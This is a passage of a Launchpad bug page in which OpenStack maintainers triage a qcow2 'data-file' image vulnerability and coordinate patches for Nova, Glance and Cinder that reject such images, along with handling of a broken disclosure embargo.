    <div class="comment-text editable-message-text" itemprop="commentText"><p>My initial impression is that this seems like a fairly similar situation to <a rel="nofollow" href="https://security.openstack.org/ossa/OSSA-2023-002.html">https:/<wbr />/security.<wbr />openstack.<wbr />org/ossa/<wbr />OSSA-2023-<wbr />002.html</a> in which case we may want to involve the Cinder and Glance security reviewers too, but we&#x27;ll start with Nova and see where it leads.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">My initial impression is that this seems like a fairly similar situation to https://security.openstack.org/ossa/OSSA-2023-002.html in which case we may want to involve the Cinder and Glance security reviewers too, but we'll start with Nova and see where it leads.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/3" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~danms" class="sprite person">Dan Smith (danms)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-01T14:04:00.985148+00:00" title="2024-04-01 14:04:00 UTC">on 2024-04-01</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/3"> #3</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>It&#x27;s also similar to an earlier one specifically referring to qcow files. We currently protect against the backing file of a qcow pointing somewhere, but it looks like this data_file option provides another route to get similar functionality. We will probably need similar mitigations in the same area we currently have them for backing files in nova, glance, and cinder.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">It's also similar to an earlier one specifically referring to qcow files. We currently protect against the backing file of a qcow pointing somewhere, but it looks like this data_file option provides another route to get similar functionality. We will probably need similar mitigations in the same area we currently have them for backing files in nova, glance, and cinder.
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/4" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~danms" class="sprite person">Dan Smith (danms)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-01T14:07:08.307407+00:00" title="2024-04-01 14:07:08 UTC">on 2024-04-01</time><span class="editable-message-last-edit-date">
                <a href="#" class="editable-message-last-edit-link">(last edit <time itemprop="editTime" datetime="2024-04-01T14:12:04.015001+00:00" title="2024-04-01 14:12:04 UTC">on 2024-04-01</time>)</a>:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/4"> #4</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>We&#x27;re also all (I think) now using oslo.utils/<wbr />imageutils to probe the qcow files. AFAICT, that does not expose the general list of extra options, so we&#x27;ll need to augment oslo.utils as well.</p>
<p>EDIT: Yeah, it does, under &quot;format-specific&quot;</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">We're also all (I think) now using oslo.utils/imageutils to probe the qcow files. AFAICT, that does not expose the general list of extra options, so we'll need to augment oslo.utils as well.

EDIT: Yeah, it does, under "format-specific"</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/5" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~danms" class="sprite person">Dan Smith (danms)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-01T14:44:35.830181+00:00" title="2024-04-01 14:44:35 UTC">on 2024-04-01</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/5"> #5</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Proposed patch to nova to detect and reject qcow2 images with data-file set</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Proposed patch to nova to detect and reject qcow2 images with data-file set</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          

          
              <div>
  <div id="comments-container"></div>
  <div class="boardComment comments-hidden-message" style="border-bottom: 0">
    <div class="boardCommentDetails">
      <table>
        <tbody>
          <tr>
            <td>
              <span class="sprite arrowRight"></span>
              1 comments hidden
              <span id="more-comments-spinner" class="hidden">
                Loading more comments
                <img src="/@@/spinner" />
              </span>
            </td>

            <td class="bug-comment-index">
              <a href="?comments=all" id="show-comments-link" class="show-comments-link sprite retry" style="white-space: nowrap">
                 view all 455 comments</a>
            </td>
          </tr>
        </tbody>
      </table>
    </div>
  </div>
</div>
          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/7" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~danms" class="sprite person">Dan Smith (danms)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-01T15:38:32.913192+00:00" title="2024-04-01 15:38:32 UTC">on 2024-04-01</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/7"> #7</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Proposed patch to glance to detect and reject qcow2 images with data-file set</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Proposed patch to glance to detect and reject qcow2 images with data-file set</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/8" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~danms" class="sprite person">Dan Smith (danms)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-01T15:41:42.949484+00:00" title="2024-04-01 15:41:42 UTC">on 2024-04-01</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/8"> #8</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I subscribed Brian Rosmaita who can evaluate the cinder impact and also review the glance patch.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I subscribed Brian Rosmaita who can evaluate the cinder impact and also review the glance patch.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/9" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~brian-rosmaita" class="sprite person">Brian Rosmaita (brian-rosmaita)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-01T18:17:55.727871+00:00" title="2024-04-01 18:17:55 UTC">on 2024-04-01</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/9"> #9</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Added Eric Harney for cinder.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Added Eric Harney for cinder.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          

          
              <div>
  <div id="comments-container"></div>
  <div class="boardComment comments-hidden-message" style="border-bottom: 0">
    <div class="boardCommentDetails">
      <table>
        <tbody>
          <tr>
            <td>
              <span class="sprite arrowRight"></span>
              1 comments hidden
              <span id="more-comments-spinner" class="hidden">
                Loading more comments
                <img src="/@@/spinner" />
              </span>
            </td>

            <td class="bug-comment-index">
              <a href="?comments=all" id="show-comments-link" class="show-comments-link sprite retry" style="white-space: nowrap">
                 view all 455 comments</a>
            </td>
          </tr>
        </tbody>
      </table>
    </div>
  </div>
</div>
          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/11" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~brian-rosmaita" class="sprite person">Brian Rosmaita (brian-rosmaita)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-01T21:18:43.292133+00:00" title="2024-04-01 21:18:43 UTC">on 2024-04-01</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/11"> #11</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Guess I should state explicitly that this also affects cinder, when it converts an image to raw format to write to a volume.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Guess I should state explicitly that this also affects cinder, when it converts an image to raw format to write to a volume.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          

          
              <div>
  <div id="comments-container"></div>
  <div class="boardComment comments-hidden-message" style="border-bottom: 0">
    <div class="boardCommentDetails">
      <table>
        <tbody>
          <tr>
            <td>
              <span class="sprite arrowRight"></span>
              1 comments hidden
              <span id="more-comments-spinner" class="hidden">
                Loading more comments
                <img src="/@@/spinner" />
              </span>
            </td>

            <td class="bug-comment-index">
              <a href="?comments=all" id="show-comments-link" class="show-comments-link sprite retry" style="white-space: nowrap">
                 view all 455 comments</a>
            </td>
          </tr>
        </tbody>
      </table>
    </div>
  </div>
</div>
          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/13" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sylvain-bauza" class="sprite person">Sylvain Bauza (sylvain-bauza)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-02T07:32:20.745666+00:00" title="2024-04-02 07:32:20 UTC">on 2024-04-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/13"> #13</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I agree with the design proposal which is about not accepting an image with a data-file set.<br />
Nova doesn&#x27;t need to use an external disk for a guest, so we could no longer support it.</p>
<p>I&#x27;ll look at Dan&#x27;s patch today.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I agree with the design proposal which is about not accepting an image with a data-file set.
Nova doesn't need to use an external disk for a guest, so we could no longer support it.

I'll look at Dan's patch today.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/14" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sylvain-bauza" class="sprite person">Sylvain Bauza (sylvain-bauza)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-02T09:06:24.152983+00:00" title="2024-04-02 09:06:24 UTC">on 2024-04-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/14"> #14</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Nova&#x27;s patch proposed by Dan relies on the same mitigation provided in <a rel="nofollow" href="https://security.openstack.org/ossa/OSSA-2023-002.html">https:/<wbr />/security.<wbr />openstack.<wbr />org/ossa/<wbr />OSSA-2023-<wbr />002.html</a> where we rely on a metadata that was added in osloutils&#x27;s imageutils.py module by <a rel="nofollow" href="https://github.com/openstack/oslo.utils/commit/2180db82b605cf84902ee379fffc0b34e17e92c7">https:/<wbr />/github.<wbr />com/openstack/<wbr />oslo.utils/<wbr />commit/<wbr />2180db82b605cf8<wbr />4902ee379fffc0b<wbr />34e17e92c7</a></p>
<p>This sounds to me the correct approach as we can backport it down to the last Maintained releases but any distro can also backport it further down to Ussuri if they want (exactly like OSSA-2023-002)</p>
<p>+1 on nova-2059809.patch but I&#x27;ll test it on a dev environment.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Nova's patch proposed by Dan relies on the same mitigation provided in https://security.openstack.org/ossa/OSSA-2023-002.html where we rely on a metadata that was added in osloutils's imageutils.py module by https://github.com/openstack/oslo.utils/commit/2180db82b605cf84902ee379fffc0b34e17e92c7

This sounds to me the correct approach as we can backport it down to the last Maintained releases but any distro can also backport it further down to Ussuri if they want (exactly like OSSA-2023-002)




+1 on nova-2059809.patch but I'll test it on a dev environment.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/15" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~fungi" class="sprite person">Jeremy Stanley (fungi)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-02T12:32:18.263703+00:00" title="2024-04-02 12:32:18 UTC">on 2024-04-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/15"> #15</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Martin Kaesberger: Did you notify any organizations about this other than reporting the bug to us? I just received a request from a public cloud provider for access to the bug report, which means the private embargo has been broken and we probably need to disclose this by switching to our public workflow immediately rather than continuing to work on it in private.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Martin Kaesberger: Did you notify any organizations about this other than reporting the bug to us? I just received a request from a public cloud provider for access to the bug report, which means the private embargo has been broken and we probably need to disclose this by switching to our public workflow immediately rather than continuing to work on it in private.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/16" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~brian-rosmaita" class="sprite person">Brian Rosmaita (brian-rosmaita)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-02T12:45:09.560251+00:00" title="2024-04-02 12:45:09 UTC">on 2024-04-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/16"> #16</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Updated cinder patch to include a release note.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Updated cinder patch to include a release note.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/17" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~fungi" class="sprite person">Jeremy Stanley (fungi)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-02T12:48:42.643286+00:00" title="2024-04-02 12:48:42 UTC">on 2024-04-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/17"> #17</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>For now I&#x27;m subscribing some technical representatives from OVH (the provider on whose behalf I was contacted), on the assumption they were the only outside organization notified, so that they might assist with reviewing and testing the proposed fixes.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">For now I'm subscribing some technical representatives from OVH (the provider on whose behalf I was contacted), on the assumption they were the only outside organization notified, so that they might assist with reviewing and testing the proposed fixes.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/18" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~arnaud-morin" class="sprite person">Arnaud Morin (arnaud-morin)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-02T13:19:00.794730+00:00" title="2024-04-02 13:19:00 UTC">on 2024-04-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/18"> #18</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2059809/+attachment/5761287/+files/nova.patch" class="sprite haspatch-icon">nova.patch</a>
        <a class="sprite edit action-icon" href="/nova/+bug/2059809/+attachment/5761287">Edit</a>
        
        (2.4 KiB,
        text/plain)
        
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/19" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~arnaud-morin" class="sprite person">Arnaud Morin (arnaud-morin)</a>
            wrote
